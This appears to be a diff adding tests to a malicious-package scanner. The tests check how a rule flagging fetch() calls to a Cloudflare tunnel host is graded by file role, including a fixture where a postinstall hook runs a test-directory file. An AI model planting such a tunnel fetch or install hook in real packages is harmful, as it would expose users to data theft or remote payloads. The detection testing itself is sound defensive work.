@@ -514,3 +514,51 @@ def test_package_json_metadata_at_the_match_cap_stays(tmp_path: Path) -> None:
     }
     found = _ip_findings(tmp_path, {"package.json": json.dumps(manifest, indent=1).encode()})
     assert [f.severity for f in found] == [Severity.MEDIUM] * 3
+
+
+TUNNEL = b"fetch('https://calm-river-lake-one.trycloudflare.com/x')"
+
+
+def _exfil_by_path(tmp_path: Path, files: dict[str, bytes]) -> dict[str | None, Finding]:
+    one = PackageBatch(
+        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
+    )
+    (result,) = analyse_batch(
+        one, lambda s: files if s.ref.version == "1.0.1" else {}, ContentCache(tmp_path, RULES)
+    ).versions
+    return {f.evidence[0].path: f for f in result.findings if f.rule_id == "static.exfil-endpoint"}
+
+
+def test_a_match_only_in_a_test_file_is_low(tmp_path: Path) -> None:
+    """Round 5 (L5): tests, stories and mocks run under a test runner, not at install or load."""
+    files = {
+        "package.json": b'{"name": "kx", "main": "lib/index.js"}',
+        "lib/index.js": TUNNEL,
+        "src/adapter/chatPorts.test.ts": TUNNEL + b" // 1",
+        "src/screens/Design.stories.tsx": TUNNEL + b" // 2",
+        "lib/__mocks__/net.js": TUNNEL + b" // 3",
+        "py/test_client.py": TUNNEL + b" // 4",
+    }
+    found = _exfil_by_path(tmp_path, files)
+    assert found["lib/index.js"].severity is Severity.HIGH
+    for path in set(files) - {"package.json", "lib/index.js"}:
+        assert found[path].severity is Severity.LOW, path
+        assert "Only in a test file" in found[path].explanation
+
+
+def test_a_test_or_docs_file_the_package_loads_is_not_taken_for_one(tmp_path: Path) -> None:
+    """A file an install hook runs or the entry point loads keeps its findings, whatever its
+    name: payloads hide in `test/`."""
+    files = {
+        "package.json": (
+            b'{"name": "kx", "main": "index.js", "scripts": {"postinstall": "node test/setup.js"}}'
+        ),
+        "index.js": b"require('./lib/util.spec.js')",
+        "lib/util.spec.js": TUNNEL,
+        "test/setup.js": TUNNEL + b" // 1",
+        "test/other.js": TUNNEL + b" // 2",
+    }
+    found = _exfil_by_path(tmp_path, files)
+    assert found["lib/util.spec.js"].severity is Severity.HIGH
+    assert found["test/setup.js"].severity is Severity.HIGH
+    assert found["test/other.js"].severity is Severity.LOW
